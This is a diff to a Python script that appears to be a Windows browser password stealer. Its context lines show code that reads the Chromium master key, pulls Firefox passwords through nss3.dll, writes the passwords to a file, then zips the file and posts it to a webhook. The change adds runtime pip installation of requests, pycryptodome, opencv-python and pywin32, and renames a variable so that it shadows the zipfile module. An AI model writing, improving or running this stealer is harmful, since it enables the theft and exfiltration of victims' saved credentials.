@@ -3,13 +3,36 @@ import json
 import base64
 import shutil
 import sqlite3
-import requests
-from Cryptodome.Cipher import AES
+import subprocess
+import sys
 import tempfile
 import zipfile
 import ctypes
 import ctypes.wintypes
 import traceback
+
+def install_modules():
+    """Check and install required modules."""
+    required_modules = ['requests', 'psutil', 'pycryptodome', 'opencv-python', 'pywin32']
+    for module in required_modules:
+        try:
+            __import__(module)
+        except ImportError:
+            print(f"[-] {module} not found. Installing...")
+            try:
+                # Use sys.executable to ensure pip uses the same Python environment
+                subprocess.check_call([sys.executable, '-m', 'pip', 'install', module, '--no-cache-dir'])
+                print(f"[+] {module} installed successfully.")
+            except subprocess.CalledProcessError as e:
+                print(f"[-] Failed to install {module}: {e}")
+                sys.exit(1)
+
+# Install modules before importing Cryptodome
+install_modules()
+
+# Now import Cryptodome
+from Cryptodome.Cipher import AES
+import requests
 
 def get_master_key(browser_path):
     local_state_path = os.path.join(os.environ['LOCALAPPDATA'], browser_path, 'User Data', 'Local State')
@@ -115,7 +138,6 @@ def extract_firefox_passwords_nss():
         print("[-] Firefox not installed. Skipping.")
         return []
 
-    
     nss_path = None
     for path in [
         r"C:\Program Files\Mozilla Firefox\nss3.dll",
@@ -183,8 +205,8 @@ def save_passwords_to_file(passwords, filepath):
 
 def zip_and_send(filepath, webhook_url):
     zip_path = filepath + '.zip'
-    with zipfile.ZipFile(zip_path, 'w') as zipf:
-        zipf.write(filepath, arcname=os.path.basename(filepath))
+    with zipfile.ZipFile(zip_path, 'w') as zipfile:
+        zipfile.write(filepath, arcname=os.path.basename(filepath))
     with open(zip_path, 'rb') as f:
         files = {'file': (os.path.basename(zip_path), f)}
         response = requests.post(webhook_url, files=files)
